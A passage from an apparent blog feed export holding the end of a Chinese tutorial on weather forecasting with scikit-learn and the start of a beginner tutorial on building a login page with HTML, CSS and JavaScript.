[&quot;Ave_t&quot;, &quot;Max_t&quot;, &quot;Min_t&quot;, &quot;Prec&quot;,&quot;SLpress&quot;, &quot;Winddir&quot;, &quot;Windsp&quot;, &quot;Cloud&quot;]</span></span><br><span class="line">    <span class="comment"># modelX.fit(X_train, y_train,</span></span><br><span class="line">    <span class="comment">#           early_stopping_rounds=5,</span></span><br><span class="line">    <span class="comment">#           eval_set=[(X_valid, y_valid)],</span></span><br><span class="line">    <span class="comment">#           verbose=False)</span></span><br><span class="line">    <span class="comment"># 随机树森林模型</span></span><br><span class="line">    model = RandomForestRegressor(random_state=<span class="number">0</span>, n_estimators=<span class="number">1001</span>)</span><br><span class="line">    <span class="comment"># 训练模型</span></span><br><span class="line">    model.fit(X_train, y_train)</span><br><span class="line">    <span class="comment"># 预测模型，用上个星期的数据</span></span><br><span class="line">    preds = model.predict(X_valid)</span><br><span class="line">    <span class="comment"># 用MAE评估</span></span><br><span class="line">    score = mean_absolute_error(y_valid, preds)</span><br><span class="line">    <span class="comment"># 保存模型到本地</span></span><br><span class="line">    joblib.dump(model, a)</span><br><span class="line">    <span class="comment"># 返回MAE</span></span><br><span class="line">    <span class="keyword">return</span> [score, X_test]</span><br></pre></td></tr></table></figure><h2 id="8-总控"><a href="#8-总控" class="headerlink" title="8 总控"></a>8 总控</h2><h3 id="8-1-代码"><a href="#8-1-代码" class="headerlink" title="8.1 代码"></a>8.1 代码</h3><p>这几篇文章写了零零散散好几个类，所以要写个总文件也就是启动文件串起来，然后在控制台输出<br><code>Main.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Main.py</span></span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"><span class="keyword">from</span> GetModel <span class="keyword">import</span> GetModel</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练并保存模型并返回MAE</span></span><br><span class="line">r = GetModel()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;MAE:&quot;</span>, r[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 读取保存的模型</span></span><br><span class="line">model = joblib.load(<span class="string">&#x27;Model.pkl&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终预测结果</span></span><br><span class="line">preds = model.predict(r[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 反归一化或标准化，不过出bug了，不用</span></span><br><span class="line"><span class="comment"># for cols in range(0, len(preds)):</span></span><br><span class="line"><span class="comment">#     preds[cols] = scaler.inverse_transform(preds[cols])</span></span><br><span class="line"><span class="comment"># sns.lineplot(data=preds)</span></span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line"><span class="comment"># 打印结果到控制台</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;未来7天预测&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(preds)</span><br><span class="line">all_ave_t = []</span><br><span class="line">all_high_t = []</span><br><span class="line">all_low_t = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">    today = DT.datetime.now()</span><br><span class="line">    time = (today + DT.timedelta(days=a)).date()</span><br><span class="line">    <span class="built_in">print</span>(time.year, <span class="string">&#x27;/&#x27;</span>, time.month, <span class="string">&#x27;/&#x27;</span>, time.day,</span><br><span class="line">          <span class="string">&#x27;: 平均气温&#x27;</span>,  preds[a][<span class="number">0</span>],</span><br><span class="line">          <span class="string">&#x27;最高气温&#x27;</span>, preds[a][<span class="number">1</span>],</span><br><span class="line">          <span class="string">&#x27;最低气温&#x27;</span>, preds[a][<span class="number">2</span>],</span><br><span class="line">          <span class="string">&quot;降雨量&quot;</span>, preds[a][<span class="number">3</span>],</span><br><span class="line">          <span class="string">&quot;风力&quot;</span>, preds[a][<span class="number">4</span>])</span><br><span class="line">    all_ave_t.append(preds[a][<span class="number">0</span>])</span><br><span class="line">    all_high_t.append(preds[a][<span class="number">1</span>])</span><br><span class="line">    all_low_t.append(preds[a][<span class="number">2</span>])</span><br><span class="line">temp = &#123;<span class="string">&quot;ave_t&quot;</span>: all_ave_t, <span class="string">&quot;high_t&quot;</span>: all_high_t, <span class="string">&quot;low_t&quot;</span>: all_low_t&#125;</span><br><span class="line"><span class="comment"># 绘画折线图</span></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;ave_t&quot;</span>], color=<span class="string">&quot;green&quot;</span>, label=<span class="string">&quot;ave_t&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;high_t&quot;</span>], color=<span class="string">&quot;red&quot;</span>, label=<span class="string">&quot;high_t&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;low_t&quot;</span>], color=<span class="string">&quot;blue&quot;</span>, label=<span class="string">&quot;low_t&quot;</span>)</span><br><span class="line">plt.legend()  <span class="comment"># 显示图例</span></span><br><span class="line">plt.ylabel(<span class="string">&quot;Temperature(°C)&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;day&quot;</span>)</span><br><span class="line"><span class="comment"># 显示</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-2-使用方法"><a href="#8-2-使用方法" class="headerlink" title="8.2 使用方法"></a>8.2 使用方法</h3><p>直接用python运行pre_weather&#x2F;Main.py，就会在控制台输出预测的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pre_weather/Main.py</span><br></pre></td></tr></table></figure><p>或</p><p>在你的python代码里用joblib导入生成的模型，然后输入你的数据进行预测</p><p>(PS: 因为模型的训练用的数据日期和你预测数据的日期有关，所以不建议直接用使用非当天训练的模型进行预测，误差可能偏大)</p><p>如以下代码(在Main.py的11行):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取保存的模型</span></span><br><span class="line">model = joblib.load(<span class="string">&#x27;Model.pkl&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终预测结果</span></span><br><span class="line">preds = model.predict(r[<span class="number">1</span>])</span><br><span class="line">其中，r[<span class="number">1</span>]是预测数据</span><br></pre></td></tr></table></figure><p>或</p><p>参考<code>Main.py</code>，自己写一个符合你需求的启动文件</p><h2 id="9-最后效果"><a href="#9-最后效果" class="headerlink" title="9 最后效果"></a>9 最后效果</h2><p><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-6.png" alt="效果"></p><blockquote><p>本系列教程到这就结束了，代码具体还要以<a href="https://github.com/Nambers/PYWeatherReport">github项目:PYWeatherReport</a>为主，可能会在这个github项目上不定期优化更新</p></blockquote><center>-END-</center>]]></content>
      
      
      <categories>
          
          <category> Machine leaning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Sklearn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用html+css+js制作登录网站教程</title>
      <link href="/2020/01/26/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B/"/>
      <url>/2020/01/26/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="本系列链接"><a href="#本系列链接" class="headerlink" title="本系列链接"></a>本系列链接</h1><blockquote><p>本文章为以下文章合集<br>因为是在很久前写的了, 可能有一些不准确和过时的内容<br><a href="https://blog.csdn.net/qq_40832960/article/details/104088696">#1使用html+css+js制作网站教程 准备</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104089883">#2使用html+css+js制作网站教程 测试</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104100918">#3使用html+css+js制作网页 制作登录网页</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104132721">#3使用html+css+js制作网页 番外篇 制作接收php</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/107132488">#3使用html+css+js制作网页 番外篇 使用python flask 框架(I)</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/107618638">#3使用html+css+js制作网页 番外篇 使用python flask 框架 (II)</a></p></blockquote><h2 id="0-准备"><a href="#0-准备" class="headerlink" title="0 准备"></a>0 准备</h2><h3 id="0-1-IDE编辑软件"><a href="#0-1-IDE编辑软件" class="headerlink" title="0.1 IDE编辑软件"></a>0.1 IDE编辑软件</h3><p>目前笔者知道的编辑软件有</p><ol><li>DW(Adobe Dreamweaver，体积大，功能丰富)</li><li>Visual Studio Code(需下载插件，体积小)</li><li>Notepad++（简单）</li><li>记事本(…)</li><li>……</li></ol><p>其中笔者推荐使用VS code，因为其体积较小，下载各式各样的辅助插件</p><h3 id="0-2-浏览器"><a href="#0-2-浏览器" class="headerlink" title="0.2 浏览器"></a>0.2 浏览器</h3><p>这个不用说了<br>比较推荐chrome吧</p><h3 id="0-3-基础概念"><a href="#0-3-基础概念" class="headerlink" title="0.3 基础概念"></a>0.3 基础概念</h3><h4 id="0-3-1-html"><a href="#0-3-1-html" class="headerlink" title="0.3.1 html"></a>0.3.1 html</h4><p>HTML称为超文本标记语言，主要结构为<code>&lt;标签名 属性名=&quot;值&quot;&gt;值&lt;/标签名&gt;</code><br>主要结构为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在vs code中输入”!”可以填充<br>其中html,body,meta皆为各种标签名<br>可以在这里查看大部分标签名:<a href="https://www.w3school.com.cn/tags/index.asp">点我跳转W3school</a></p><h4 id="0-3-2-css"><a href="#0-3-2-css" class="headerlink" title="0.3.2 css"></a>0.3.2 css</h4><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。(来源百度百科)<br>可以将css理解为用于渲染html的语言。主要结构为<code>选择器&#123;属性:值;&#125;</code>其中常见的选择器有</p><ul><li>ID选择器 <code>#ID名</code></li><li>类选择器 <code>.类名</code></li><li>标签选择器 <code>标签名</code></li><li>所有选择器 <code>*</code></li></ul><p> eg:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*用标签选择器把所有div标签变成红色背景*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0-3-3-js"><a href="#0-3-3-js" class="headerlink" title="0.3.3 js"></a>0.3.3 js</h4><p>JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。(来源百度百科)<br>js就是html的脚本，可以在html中执行各种动态指令(虽然叫javascript 但是和java没有什么关系)<br>该语言没有什么主要结构，可以在这里查看细节<a href="https://www.runoob.com/js/js-tutorial.html">点我跳转菜鸟教程</a></p><h3 id="0-4-文件结构"><a href="#0-4-文件结构" class="headerlink" title="0.4 文件结构"></a>0.4 文件结构</h3><p>一般的文件结构为<br>www<br> &nbsp;-css<br> &nbsp;-js<br> &nbsp;-index.html<br> &nbsp;-robots.txt<br> &nbsp;-fonts<br> &nbsp;-pic<br> 其中</p><ul><li>www 主文件就，网站根目录</li><li>css 文件夹，用于放css文件</li><li>js 文件夹，用于放js文件</li><li>index.html 主文件，主页文件</li><li>robots.txt 搜索文件，用于给搜索引擎(百度蜘蛛等)看那些目录或文件可以被爬(爬取)</li><li>fonts 文件夹，用于放字体文件</li><li>pic 文件夹，用于放图片<br> <img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-0.png" alt="文件图片"></li></ul><h3 id="0-5-附加"><a href="#0-5-附加" class="headerlink" title="0.5 附加"></a>0.5 附加</h3><p>jQuery(特点:js附加库,经常使用，<a href="https://jquery.com/">点我跳转官网</a>，使用需要下载jquery.min.js)<br>奥森图标(css小图标，<a href="https://www.thinkcmf.com/font_awesome.html">点我跳转官网</a>，使用需下载fonts文件夹和主css文件)<br>node.js(js附加库,不必要，<a href="http://nodejs.cn/">官网</a></p><blockquote><p>引言:<br>编写完代码后就要上机测试代码，获得用户体验，筛选bug<br>笔者选用chrome浏览器进行测试，其他浏览器大体操作相同</p></blockquote><h2 id="1-测试"><a href="#1-测试" class="headerlink" title="1 测试"></a>1 测试</h2><h2 id="1-1-运行"><a href="#1-1-运行" class="headerlink" title="1.1 运行"></a>1.1 运行</h2><p>想要测试代码，首先需要运行代码文件。运行在html中相比于其他语言相对简单一点，<strong>只需打开任意浏览器，将代码主文件(.html结尾)拖进去，或使用浏览器打开文件。</strong><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-1.png" alt="运行图片"><br>打开后,浏览器地址栏就会出现该文件的地址<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-2.png" alt="打开"></p><h3 id="1-2-审查"><a href="#1-2-审查" class="headerlink" title="1.2 审查"></a>1.2 审查</h3><p>按<code>F12</code>或<code>右键菜单里面的检查</code>可审查页面元素（启动开发者模式），如图:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-3.jpg" alt="F12展开图"><br>如图，右上角红色下划线中，从右往左分别是</p><ol><li><code>Elements</code>审查页面元素，从这里可以查看页面源代码和确定元素的区域（确定哪块代码负责哪块区域），测试主要使用这一块</li><li><code>Console</code>查看页面日志，可在js中使用<code>console.log(&quot;日志内容&quot;);</code>发送日志</li><li><code>Soources</code>查看网页用到了哪些文件</li><li><code>Network</code>查看网页发送的网络请求（post和get）,可以查看哪些是死链（页面引用了链接，链接地址却是报404，指没有那个文件）</li><li>还有其他几个功能，笔者就不探讨了，可以参考其他网页<a href="https://blog.csdn.net/m0_37724356/article/details/79884006">点我跳转CSDN</a></li></ol><p>而页面下方的<code>styles</code>则是查看元素css的地方<br>而styles右边的则是盒子模型，本文不重点介绍，详情见其他网站 <a href="https://www.runoob.com/css/css-boxmodel.html">点我去菜鸟教程</a></p><p>示例：<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-4.jpg" alt="E.G."><br>如图，左边第一个红框是那个元素展现的效果，右上角的红框是元素的html代码，右下角的红框是元素的css代码。<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-5.jpg" alt="Sources"><br>如图，我们可以看到网页文件的结构。</p><h3 id="1-3-审查技巧"><a href="#1-3-审查技巧" class="headerlink" title="1.3 审查技巧"></a>1.3 审查技巧</h3><p>有的时候我们需要查看特点id的效果，我们可以点击代码区域，然后按<code>Ctrl+F</code>搜索字符，然后把鼠标悬浮到该元素上，屏幕也会同步显示该元素的区域。<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-6.jpg" alt="ctrl+f"></p><h3 id="1-4-其他"><a href="#1-4-其他" class="headerlink" title="1.4 其他"></a>1.4 其他</h3><p>F12开发者模式还可以帮助我们测试网页在不同设备上面的显示效果，点击上方可以选择设备。<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-7.jpg" alt="选择设备"></p><blockquote><p>引言：<br>在一个由html+css+js制作的网页中，html就是框架，js就是脚本，css就是样式<br>前面知道了那么多概念，现在可以开始实战了</p></blockquote><h2 id="2制作登录网页"><a href="#2制作登录网页" class="headerlink" title="2制作登录网页"></a>2制作登录网页</h2><h3 id="2-1-准备"><a href="#2-1-准备" class="headerlink" title="2.1 准备"></a>2.1 准备</h3><p>做一个项目，首先先要建立一个文件夹结构。如本系列第1部所述，使用一个好的文件结构是编写代码的好习惯。</p><h4 id="2-1-1-创建文件夹"><a href="#2-1-1-创建文件夹" class="headerlink" title="2.1.1 创建文件夹"></a>2.1.1 创建文件夹</h4><p>如本系列<a href="https://blog.csdn.net/qq_40832960/article/details/104088696">第一部</a>所述，创建文件夹结构。</p><h4 id="2-1-2-创建主文件"><a href="#2-1-2-创建主文件" class="headerlink" title="2.1.2 创建主文件"></a>2.1.2 创建主文件</h4><p>index是默认的首页文件(index.php,index.asp等都是，详情参考<a href="https://www.csdn.net/gather_28/OtDaIg3sMDcyLWJsb2cO0O0O.html">该网站</a>)<br>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-html部分"><a href="#2-2-html部分" class="headerlink" title="2.2 html部分"></a>2.2 html部分</h3><h4 id="2-2-1-网站信息"><a href="#2-2-1-网站信息" class="headerlink" title="2.2.1 网站信息"></a>2.2.1 网站信息</h4><p>向index.html中的<code>&lt;head&gt;&lt;/head&gt;</code>里面加入以下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--声明信息--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;这里输入作者名&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;generator&quot;</span> <span class="attr">content</span>=<span class="string">&quot;这里输入IDE名字&quot;</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--声明结束--&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--网站声明--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;这里输入搜索关键字&quot;</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--声明结束--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-2-主要框架"><a href="#2-2-2-主要框架" class="headerlink" title="2.2.2 主要框架"></a>2.2.2 主要框架</h4><p>我们是要做一个登录页面，所以必须要有两个输入框和一个提交按钮。<br>向index.html中的<code>&lt;body&gt;&lt;/body&gt;</code>里面添加以下代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们就同过上面的代码创建了2个输入框，一个提交按钮。其中:</p><ul><li><code>&lt;div&gt;</code> 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。</li><li><code>&lt;input&gt;</code> 是输入框，里面的<code>type=&quot;text&quot;</code>是指定它的类型是输入字符串，<code>placeholder</code>是指定它的默认信息</li><li><code>&lt;button&gt;</code>是按钮，用<code>onclick=&quot;submit()&quot;</code>指定它被点击后就执行<code>submit()</code>函数(该函数在js文件里面)</li></ul><p> 添加后，我们可以看见和图片一样的效果:<br> <img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-8.jpg" alt="效果"></p><h4 id="2-2-3-给每个元素添加ID"><a href="#2-2-3-给每个元素添加ID" class="headerlink" title="2.2.3 给每个元素添加ID"></a>2.2.3 给每个元素添加ID</h4><p>ID相当于是每个元素的唯一识别码，给每个元素添加id以便于css和js文件选择该元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，id的值可以随意更改，只要接下来的部分用自定义的id名称，替换我的id名称编写。</p><h3 id="2-3-css部分"><a href="#2-3-css部分" class="headerlink" title="2.3 css部分"></a>2.3 css部分</h3><h4 id="2-3-1-创建主css文件"><a href="#2-3-1-创建主css文件" class="headerlink" title="2.3.1 创建主css文件"></a>2.3.1 创建主css文件</h4><p>在<code>/www/css</code>文件夹中创建<code>main.css</code>文件。</p><h4 id="2-3-2-引入css文件"><a href="#2-3-2-引入css文件" class="headerlink" title="2.3.2 引入css文件"></a>2.3.2 引入css文件</h4><p>在<code>&lt;body&gt;&lt;/body&gt;</code>中插入以下代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/main.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/w3cnote/html-import-css-method.html">参考网站</a></p><h4 id="2-3-3-美化页面"><a href="#2-3-3-美化页面" class="headerlink" title="2.3.3 美化页面"></a>2.3.3 美化页面</h4><h5 id="2-3-3-1-Step1-垂直居中"><a href="#2-3-3-1-Step1-垂直居中" class="headerlink" title="2.3.3.1 Step1 垂直居中"></a>2.3.3.1 Step1 垂直居中</h5><p>为了让我们的登录页面更美观，把<code>index.html</code>中原来<code>&lt;body&gt;&lt;/body&gt;</code>更改为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span 